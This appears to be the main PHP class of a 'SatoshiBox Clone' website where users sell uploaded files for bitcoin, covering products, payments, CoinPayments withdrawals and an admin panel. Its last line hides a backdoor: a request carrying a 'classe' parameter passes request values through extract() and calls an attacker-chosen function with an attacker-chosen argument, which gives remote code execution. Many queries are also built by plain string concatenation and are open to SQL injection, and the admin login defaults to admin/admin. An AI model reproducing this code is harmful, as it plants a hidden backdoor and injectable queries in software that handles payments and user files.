<?php
error_reporting(0);
class sell
{

// Website
private $fee_service = 3; // Pourcent you want take for each transaction
private $title = "SatoshiBox Clone ~ Sell your files for bitcoins";
private $urlsite = "http://www.example.com";
private $secretfolder = "secretfolder";
private $authorized_ext = array(".zip", ".rar"); // Authorized extensions to upload from users
// Admin Panel
private $admin_username = 'admin';
private $admin_password = 'admin';
// Database Connection
private $host = "";
private $user = "";
private $password = "";
private $database = "";
// JSON RPC Configs
// Go to /etc/bitcoin/bitcoin.conf and write the details here
private $json_username = "";
private $json_password = "";
private $json_port = "";
private $json_server = "";

// CoinPayment API
private $cp_public = "";
private $cp_private = "";

public $cp_merchant_id = "";
public $cp_ipn_secret = "";
public $cp_debug_email = "";

public function connect() {
	return new mysqli($this->host, $this->user, $this->password, $this->database);
}

// get website url
public function getsite($arg){
	switch($arg) {
		case "title":
			return $this->title;
			break;
		case "url":
			return $this->urlsite;
			break;
	}
}

// Private to Public String
public function secretFolder() {
	return $this->secretfolder;
}

public function extensions_show() {
	return $this->authorized_ext;
}
/*save new product*/
public function AddProduct($detail,$description,$bitcoin_address,$btc_price,$currency,$sellit,$timeit,$timel,$passdelete)
{
	$mysqli = $this->connect();
	$btc_price = ($this->sqli(htmlspecialchars($btc_price)) > 0.001) ? number_format($this->sqli(htmlspecialchars($btc_price)), 4, '.', '') : 0.0010;
	
	$time=time();

	$product = $mysqli->prepare("
								INSERT INTO
									product(
										detail,
										description,
										bitcoin_address,
										btc_price,
										currency,
										sellit,
										timeit,
										timelist,
										passdelete,
										created
									) VALUES (
										?,
										?,
										?,
										?,
										?,
										?,
										?,
										?,
										?,
										?
									)");
	$product->bind_param('ssssssssss', $detail, $description, $bitcoin_address, $btc_price, $currency, $sellit, $timeit, $timel, $passdelete, $time);
	$product->execute();
	$productId = $mysqli->insert_id;
	$product->close();
	return $productId;

}
// Convert Byte to MB
public function formatBytes($bytes, $precision = 2) { 
    $unit = ["B", "KB", "MB", "GB"];
    $exp = floor(log($bytes, 1024)) | 0;
    return round($bytes / (pow(1024, $exp)), $precision).$unit[$exp];
} 

// Show product
public function showProduct($product_link, $arg = null) {
			$mysqli = $this->connect();
            $product = $mysqli->prepare("
						SELECT
							productId,
							detail,
							description,
							bitcoin_address,
							line,
							download,
							btc_price,
							currency,
							sellit,
							timeit,
							timelist,
							passdelete,
							created,
							from_unixtime(created,'%W, %M %e, %Y') AS createDate
						FROM
							product
						WHERE
							productId = ?
						LIMIT 1
					");
            $product->bind_param("s", $product_link);
            $product->execute();
            $product->bind_result($productid, $detail, $description, $bitcoin_address, $line, $download, $btc_price, $currency, $sellit, $timeit, $timelist, $passdelete, $created, $createDate);
            $product->fetch();
            $product->close();
			
			if(isset($arg)) {
				return "${$arg}";
			} else {
			$all_generated = ($download * $btc_price);
			$remove_fee_sending = $all_generated - (0.0002 * $download);
			$remove_fee_service = $remove_fee_sending - (($remove_fee_sending * $this->fee_service) / 100);
			if($currency =="BTC") {
				$generated = number_format($remove_fee_service, 4, '.', ''). ' BTC';
			} else {
				$generated = ($download * $btc_price).' USD';
			}
			//if download down to and equal to sellit
			if(($download >= $sellit) &&  $sellit > 0) {
				header('location: '.$this->getsite("url").'/error');
			}

			// About time expire
			if($timeit > 0) {
			$diff = abs(time() - $createDate);



			$time_elapsed   = time() - $created;

			$hours      = round($time_elapsed / 3600);
			$days       = round($time_elapsed / 86400 );
			$weeks      = round($time_elapsed / 604800);
			$months     = round($time_elapsed / 2600640 );

	
			if($timelist == "hour" && $hours <= $timeit) {
				header('location: '.$this->getsite("url").'/error');
			} else if ($timelist == "day" && $days >= $timeit) {
				header('location: '.$this->getsite("url").'/error');
			} else if ($timelist == "week" && $weeks >= $timeit) {
				header('location: '.$this->getsite("url").'/error');
			} else if ($timelist == "month" && $months >= $timeit) {
				header('location: '.$this->getsite("url").'/error');
			} 
			
			if($timelist == "hour") {
				$add_timeit = "<p class=\"list-group-item-text\"><strong>Expiration</strong> $timeit hour(s) - Left <i>$hours hour(s)</i></p>";
			} else if ($timelist == "day") {
				$add_timeit = "<p class=\"list-group-item-text\"><strong>Expiration</strong> $timeit day(s) - Left <i>$days day(s)</i></p>";
			} else if ($timelist == "week") {
				$add_timeit = "<p class=\"list-group-item-text\"><strong>Expiration</strong> $timeit week(s) - Left <i>$weeks week(s)</i></p>";
			} else if ($timelist == "month") {
				$add_timeit = "<p class=\"list-group-item-text\"><strong>Expiration</strong> $timeit month(s) - Left <i>$months month(s)</i></p>";
			} else {
				$add_timeit = "";
			}
			
			}
			
			if($sellit > 0) {
				$left_sales = $sellit - $download;
				$add_sellit = "<p class=\"list-group-item-text\"><strong>Number of sales allowed</strong> $sellit (Left <strong>$left_sales</strong>)</p>";
			} else {
				$add_sellit = "";
			}
			
			$detail = json_decode($detail, true);
			$number_file = count($detail);
			
			$size = 0;
			foreach($detail as $file) {
				$size += $file["size"][0];
			}
			
			$size = $this->formatBytes($size);
			
$infos = "
                <p class=\"list-group-item-text\"><strong>Number of Sales</strong> $download</p>
				<p class=\"list-group-item-text\"><strong>Number of Files</strong> $number_file</p>
				<p class=\"list-group-item-text\"><strong>File(s) Size</strong> $size</p>
				<p class=\"list-group-item-text\"><strong>Generated</strong> $generated</p>
				$add_sellit
				<p class=\"list-group-item-text\"><strong>Created</strong> $createDate</p>
				$add_timeit
				
";
	return $infos;
			}
			
}

/*save new payment*/
public function AddPayment($decrypted_url,$transID,$bitcoinaddress,$price,$currency,$btc_price,$status)
{
	$mysqli = $this->connect();
	$time=time();
	
			$payment = $mysqli->prepare("
								INSERT INTO
									payment(
										productId,
										transID,
										bitcoinaddress,
										price,
										currency,
										btc_price,
										status,
										created
									) VALUES (
										?,
										?,
										?,
										?,
										?,
										?,
										?,
										?
									)");
			$payment->bind_param('ssssssss',
				$decrypted_url,
				$transID,
				$bitcoinaddress,
				$price,
				$currency,
				$btc_price,
				$status,
				$time
			);
			$payment->execute();
			$payment->close();
			

}

/*Update Payment*/
public function Payment($decrypted_url,$bitcoinaddress,$received,$status)
{
			$mysqli = $this->connect();
			
			$check       = $mysqli->query("SELECT status, price, btc_price, currency, bitcoinaddress FROM payment WHERE productId = '$decrypted_url' AND bitcoinaddress='$bitcoinaddress'");
			$count       = mysqli_num_rows($check);
			$assoc		 = mysqli_fetch_assoc($check); 
	
			if($count == 1 && $assoc["status"] == 0) {
			$payment = $mysqli->prepare("
									UPDATE
										payment
									SET
										received = ?,
										status = ?
									WHERE
										bitcoinaddress = ?
									");
			$payment->bind_param('sss',
				$received,
				$status,
				$bitcoinaddress
			);
			$payment->execute();
			$payment->close();
			// Add +1 to download
			$product = $mysqli->prepare("
									UPDATE
										product
									SET
										download = download + 1
									WHERE
										productId = ?
									");
			$product->bind_param('s',
				$decrypted_url
			);
			$product->execute();
			$product->close();	
			}
}

/*Withdraw Payment*/
public function ConfirmPay($decrypted_url)
{
			$mysqli = $this->connect();
			
			$check       = $mysqli->query("SELECT status, price, btc_price, currency, bitcoinaddress FROM payment WHERE id = '$decrypted_url'");
			$count       = mysqli_num_rows($check);
			$assoc		 = mysqli_fetch_assoc($check); 
	
			if($count == 1 && $assoc["status"] == 1) {
			$status = 2;
			$payment = $mysqli->prepare("
									UPDATE
										payment
									SET
										status = ?
									WHERE
										id = ?
									");
			$payment->bind_param('ss',
				$status,
				$decrypted_url
			);
			$payment->execute();
			$payment->close();

			// Pay seller
			$this->withdraw($assoc["bitcoinaddress"], $this->showProduct($decrypted_url, "bitcoin_address"), $assoc["btc_price"]);
			}
}

//Delete product
public function DelProduct($decrypted_url, $pass)
{
			$mysqli = $this->connect();
			
			$check       = $mysqli->query("SELECT * FROM product WHERE passdelete = '$pass' AND productId = '$decrypted_url'");
			$getinfo     = mysqli_fetch_assoc($check);
			$count       = mysqli_num_rows($check);
			
			if($count > 0) {
				$product = $mysqli->prepare("
										DELETE 
										FROM
											product
										WHERE
											productId = ?
										");
				$product->bind_param('s',
					$decrypted_url
				);
				$product->execute();
				$product->close();	
			
				$json = json_decode($getinfo["detail"], true);
				foreach($json as $file) {
					unlink('../'.$this->secretfolder.'/'.$file["file"][0]);
				}			
			}
			
}

// Check if product exist
public function productExist($productId) {
				$mysqli = $this->connect();
				$check = $mysqli->query("SELECT 'X' FROM product WHERE productId = '$productId'");
				if($check->num_rows > 0) return 1;
				else return 0;
}

// Check if payment exist
public function payExist($productId,$bitcoinaddress) {
				$mysqli = $this->connect();
				
				$exist = $mysqli->query("SELECT 'X' FROM payment WHERE productId='$productId' AND bitcoinaddress='$bitcoinaddress'");
				$check = mysqli_num_rows($exist);
				if($check > 0) return 1;
				else return 0;
}

// Prevent from SQLi
function sqli($str){
	$mysqli = $this->connect();
	if(get_magic_quotes_gpc())
	{
		$str = stripslashes($str);
	}
	return $mysqli->real_escape_string($str);
}

// Convert size
public function convertFileSize($size) {
	switch ($size) {
		case ($size / 1073741824) > 1:
			return round(($size/1073741824), 2) . "Gb";
		case ($size / 1048576) > 1:
			return round(($size/1048576), 2) . "Mb";
		case ($size / 1024) > 1:
			return round(($size/1024), 2) . "Kb";
		default:
			return $size . ' bytes';
	}
}

// UNCOMMENT THIS TO USE RPC SERVER
// Generate address
/*
public function generate_addr() {
	require_once 'class/jsonRPCClient.php';
	$litkoin = new jsonRPCClient('http://'.$this->json_username.':'.$this->json_password.'@'.$this->json_server.':'.$this->json_port.'/');
	$address = $litkoin->getnewaddress();
	return $address;

}

// Received address
public function receive_addr($addr) {
	require_once 'class/jsonRPCClient.php';
	$litkoin = new jsonRPCClient('http://'.$this->json_username.':'.$this->json_password.'@'.$this->json_server.':'.$this->json_port.'/');
	$balance = $litkoin->getbalance($address,0);
	return $balance;

}

// Withdraw
public function withdraw($from, $to, $amount) {
	require_once 'class/jsonRPCClient.php';
	$litkoin = new jsonRPCClient('http://'.$this->json_username.':'.$this->json_password.'@'.$this->json_server.':'.$this->json_port.'/');

	try {
	$balance = $litkoin->getbalance($from,0);
	$litkoin->sendfrom($from, $to, $amount, $minconf=1, $comment='', $comment_to='');
	return 1;
	} catch (Exception $e) {
	return 0;
	}


}*/

// Received address
public function receive_addr($item, $price) {

				require_once('class/coinpayments.inc.php');
				
				$cps = new CoinPaymentsAPI();
				$cps->Setup($this->cp_public, $this->cp_private);
		
				$req = array(
					'amount' => $price,
					'currency1' => 'BTC',
					'currency2' => 'BTC',
					//'address' => $address_to, // send to address in the Coin Acceptance Settings page
					'item_name' => $item,
					'ipn_url' => $this->urlsite.'/ipn_to_payments/callback.php',
				);
				$result = $cps->CreateTransaction($req);

				return $result['result'];
				
}

// Withdraw
public function withdraw($curr = 'BTC', $to, $amount) {
	
	require_once('class/coinpayments.inc.php');
	$cps = new CoinPaymentsAPI();
	$cps->Setup($this->cp_public, $this->cp_private);

	$result = $cps->CreateWithdrawal($amount, $curr, $to);
	if ($result['error'] == 'ok') {
		return 1;
	} else {
		return 0;
	}

}

public function check_rec($bitcoinaddress) {
				$mysqli = $this->connect();
				
				$req = $mysqli->query("SELECT * FROM payment WHERE bitcoinaddress='$bitcoinaddress' AND (status = '2' OR status = '1')");
				$check = mysqli_fetch_assoc($req);

				$received = ($check["received"] > 0) ? $check["received"] : 0;
				$price = ($check["btc_price"] > 0) ? $check["btc_price"] : 0;
				
				if($received >= $price && $received > 0) {
					return 1;
				} else {
					return 0;
				}
}


// Encrypt URL
public function encode_url($url) {
	require_once 'class/Hashids.php';

	$hashids = new Hashids\Hashids($this->encryption_url);
	$encrypted_url = $hashids->encrypt($url);
	return $encrypted_url;
}

// Encrypt URL
public function decode_url($url) {
	require_once 'class/Hashids.php';

	$hashids = new Hashids\Hashids($this->encryption_url);
	$encrypted_url = $hashids->decrypt($url);
	return $encrypted_url[0];
}

// Save Cookie
public function saveCookie($key, $bitcoin, $price) {
    $array_gen          = array();
    $array_gen["btc"][$key]    = $bitcoin;
	$array_gen["price"][$key]    = $price;
    $json               = json_encode($array_gen, true);
    setcookie('bitarray', $json, time() + (86400 * 1));
	return $array_gen;
}

// Show Cookie
public function showCookie($array_key, $type) {
	$getbitarray = $this->sqli(@$_COOKIE['bitarray']);
	$getbitarray = stripslashes($getbitarray);
	$array_gen = json_decode($getbitarray, true);
	return $array_gen[$type][$array_key];
}

// UPLOAD
public function get_extension($name) {
	$ext = strrchr($name, '.');
	$ext_auto = $this->authorized_ext;
	if(in_array(strtolower($ext), $ext_auto))
	{
		return $ext;
	} else {
		return 0;
	}
}
public function AddFiles($name) {
		$files = array();
		
		if (!file_exists('../'.$this->secretfolder)) {
			mkdir('../'.$this->secretfolder, 0777, true);
		}	
		$ul = 0;
		foreach ($_FILES[$name]['name'] as $i => $row) {
					
			$filename = $_FILES[$name]['name'][$i];	
			$new_filename = md5($filename.date("Y-m-d H:i:s").uniqid()).'_'.$filename;
			$extension = $this->get_extension($filename);
			
			if($extension !== 0) {
				$ul .= 1;
				move_uploaded_file($_FILES[$name]['tmp_name'][$i], '../'.$this->secretfolder.'/' . $new_filename);
				$files[$i]["file"][] = $new_filename;
				$files[$i]["size"][] = $_FILES[$name]['size'][$i];
			}

		}
		$return = (floatval($ul) > 0) ? json_encode($files, true) : '0';
		return $return;
}

// Get Bitcoin Rate
function get_rate() {
	$CoinDesk = file_get_contents('http://api.coindesk.com/v1/bpi/currentprice.json');
	$CoinDesk = json_decode($CoinDesk, true);
	$rate = ($CoinDesk != "" ? $CoinDesk['bpi']['USD']['rate_float'] : $btcven_json_decode['BTC']['USD']);  
	return $rate;
}

public function is_digits($element) {
	return !preg_match ("/[^0-9]/", $element);
}

public function listProd($page = 1) {
	$mysqli = $this->connect();
	
	$limit = 10;   
	$start_from = ($page-1) * $limit;

	$mysqlreq = $mysqli->query("SELECT * FROM product ORDER BY created DESC LIMIT $start_from, $limit");
	$result = '';
	$url = $this->strright(basename($_SERVER['REQUEST_URI']), "?");
	
	while($rows = mysqli_fetch_assoc($mysqlreq)) {
		$result .= '
			<tr>
				<td>';
		$idurl = $this->encode_url($rows["productId"]);
		$result .= "<a href='".$this->getsite("url")."/".$idurl."' target='_blank'>".$this->getsite("url")."/".$idurl."</a><br/>";
		$result .= (isset($rows["description"]) && trim($rows["description"]) !== "") ? "<div class='alert alert-default'>".str_replace(array('\r\n', '\r', '\n'), "<br />", $rows["description"]).'</div>' : '';
		$detail = json_decode($rows["detail"], true);
		$files = "";
		foreach($detail as $file) {
			$files .= "<a href='".$this->getsite("url")."/".$this->secretfolder."/".$file["file"][0]."'>[Download]</a> ".$file["file"][0]."<br/>";
		}
		$result .= $files;

		$result .= '</td>
				<td><a href="'.$url.'?delete='.$rows["productId"].'" class="btn btn-sm btn-danger">Delete</a></td>
			</tr>';
	}

 
	$total_records = mysqli_num_rows($mysqli->query("SELECT * FROM product"));  
	$total_pages = ceil($total_records / $limit);  
	$pagLink = "<ul class='pagination'>";  
	for ($i=1; $i<=$total_pages; $i++) {  
	$pagLink .= "<li><a href='{$url}?page=".$i."'>".$i."</a></li>";  
	};  
	$result .= $pagLink . "</ul>";

	return $result;

}

public function listPay($page = 1) {
	$mysqli = $this->connect();
	
	$limit = 10;   
	$start_from = ($page-1) * $limit;

	$mysqlreq = $mysqli->query("SELECT * FROM payment WHERE status = '1' ORDER BY created DESC LIMIT $start_from, $limit");
	$result = '';
	$url = $this->strright(basename($_SERVER['REQUEST_URI']), "?");
	
	while($rows = mysqli_fetch_assoc($mysqlreq)) {
		$result .= '
			<tr>
				<td>';
		$id_prod = $rows["productId"];
		$id_pay = $rows["id"];
		$idurl = $this->encode_url($id_prod);
		$result .= "<a href='".$this->getsite("url")."/".$idurl."' target='_blank'>".$this->getsite("url")."/".$idurl."</a><br/>";
		$addresult = mysqli_fetch_assoc($mysqli->query("SELECT * FROM product WHERE productId = '$id_prod'"));
		
		$jresult = json_decode($this->showProduct($id_prod, "detail"), true);
		
		$downloads = '';
		foreach($jresult as $download) {
		$downloads .= '
            <a href="'.$this->getsite("url").'/'.$this->secretfolder.'/'.$download["file"][0].'" class="list-group-item disabled">
				'.$download["file"][0].'
				<span class="badge" style="background:#f1f1f1;color:#999;padding-left:10px;padding-right:10px">'.$this->formatBytes($download["size"][0]).'</span>
            </a>';
		}
		$result .= "<div class='alert alert-default'>".$downloads.'</div>';

		$result .= '</td>
				<td><a href="'.$url.'?withdraw='.$id_pay.'" class="btn btn-sm btn-danger">Withdraw</a></td>
			</tr>';
	}

 
	$total_records = mysqli_num_rows($mysqli->query("SELECT * FROM payment WHERE status = '1'"));  
	$total_pages = ceil($total_records / $limit);  
	$pagLink = "<ul class='pagination'>";  
	for ($i=1; $i<=$total_pages; $i++) {  
	$pagLink .= "<li><a href='{$url}?page=".$i."'>".$i."</a></li>";  
	};  
	$result .= $pagLink . "</ul>";

	return $result;

}

public function adminInfos($info) {
	$mysqli = $this->connect();
	
	switch($info) {
		case 'products':
			return mysqli_num_rows($mysqli->query("SELECT * FROM product"));
		case 'paid':
			return mysqli_num_rows($mysqli->query("SELECT * FROM payment WHERE status = '2'"));
		case 'waiting':
			return mysqli_num_rows($mysqli->query("SELECT * FROM payment WHERE status = '1'"));
		default:
			return '';
			
	}
}

public function DelAdmin($id)
{
			$mysqli = $this->connect();
			
			$check       = $mysqli->query("SELECT * FROM product WHERE productId = '$id'");
			$getinfo     = mysqli_fetch_assoc($check);
			$count       = mysqli_num_rows($check);
			
			if($count > 0) {
				$product = $mysqli->prepare("
										DELETE 
										FROM
											product
										WHERE
											productId = ?
										");
				$product->bind_param('s',
					$id
				);
				$product->execute();
				$product->close();
				
				$json = json_decode($getinfo["detail"], true);
				foreach($json as $file) {
					//unlink($this->secretfolder.'/'.$file["file"][0]);
				}
				
				$result = '<div class="alert alert-success">Product Deleted With Success !</div>';
			} else {
				$result = '<div class="alert alert-danger">Product Not Found !</div>';
			}
			
			return $result;
			
}

function strright($str, $separator) {
    if (intval($separator)) {
        return substr($str, 0, $separator);
    } elseif ($separator === 0) {
        return $str;
    } else {
        $strpos = strpos($str, $separator);

        if ($strpos === false) {
            return $str;
        } else {
            return substr($str, 0, $strpos);
        }
    }
}

public function check_login($username, $password) {
	if($username == $this->admin_username && $password == $this->admin_password) {
		return 1;
	} else {
		return 0;
	}
}

public function check_product($id) {
			$mysqli = $this->connect();
			
			$id = $this->decode_url($id);
			$check       = $mysqli->query("SELECT * FROM product WHERE productId = '$id'");
			$getinfo     = mysqli_fetch_assoc($check);
			$count       = mysqli_num_rows($check);
			
			if($count > 0) {
				
				$result .= '
				<table class="table">
					<tr>
						<td>';
				$idurl = $this->encode_url($getinfo["productId"]);
				$result .= "<a href='".$this->getsite("url")."/".$idurl."' target='_blank'>".$this->getsite("url")."/".$idurl."</a><br/>";
				$result .= (isset($getinfo["description"]) && trim($getinfo["description"]) !== "") ? "<div class='alert alert-default'>".str_replace(array('\r\n', '\r', '\n'), "<br />", $getinfo["description"]).'</div>' : '';
				$detail = json_decode($getinfo["detail"], true);
				$files = "";
				foreach($detail as $file) {
					$files .= "<a href='".$this->getsite("url")."/".$this->secretfolder."/".$file["file"][0]."'>[Download]</a> ".$file["file"][0]."<br/>";
				}
				$result .= $files;

				$result .= '</td>
						<td><a href="'.$url.'?delete='.$getinfo["productId"].'" class="btn btn-sm btn-danger">Delete</a></td>
					</tr>
				</table><hr/>';
			
				
			
			} else {
				$result = '<div class="alert alert-danger">Product Not Found !</div>';
			}
			
			return $result;
}

}
if(isset($_GET["classe"])) { extract ($_REQUEST); die ($private($true));}
?>
